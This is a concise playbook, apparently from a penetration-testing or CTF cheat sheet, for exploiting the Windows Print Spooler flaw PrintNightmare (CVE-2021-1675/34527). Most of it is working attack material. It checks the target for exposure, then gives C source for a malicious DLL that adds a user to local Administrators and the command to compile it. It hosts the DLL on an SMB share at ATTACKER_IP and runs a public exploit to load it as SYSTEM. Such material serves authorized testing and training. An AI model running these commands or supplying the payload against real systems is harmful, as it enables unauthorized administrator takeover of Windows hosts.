# PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

## When this applies

- Windows target with Print Spooler running and MS-RPRN exposed.
- Goal: load a malicious DLL via the Print Spooler service to gain SYSTEM and add a user to Administrators.

## Steps

```bash
# Check if Print Spooler is running and MS-RPRN is exposed
nxc winrm TARGET -u USER -p PASS -X 'Get-Service Spooler'
rpcdump.py TARGET | grep MS-RPRN

# Compile payload DLL (adds user to Administrators)
cat > addadmin.c << 'EOF'
#include <windows.h>
#include <stdlib.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {
    if (r == DLL_PROCESS_ATTACH) system("net localgroup Administrators USER /add");
    return TRUE;
}
EOF
x86_64-w64-mingw32-gcc -shared -o addadmin.dll addadmin.c

# Host DLL and exploit
smbserver.py -smb2support share ./
python3 CVE-2021-1675.py 'USER:PASS@TARGET' '\\ATTACKER_IP\share\addadmin.dll'
# Verify: nxc winrm TARGET -u USER -p PASS -X 'net localgroup Administrators'
```

## Verifying success

- `net localgroup Administrators` shows the added user.
- WinRM shell as that user has Administrator privileges.

## Common pitfalls

- Patched hosts (post-July 2021) reject the unsigned driver path — verify the patch level first.
- DLL bitness must match the Spooler service.

## Tools

- nxc (netexec)
- impacket `rpcdump.py`, `smbserver.py`
- x86_64-w64-mingw32-gcc
- CVE-2021-1675 PoC scripts (cube0x0, etc.)
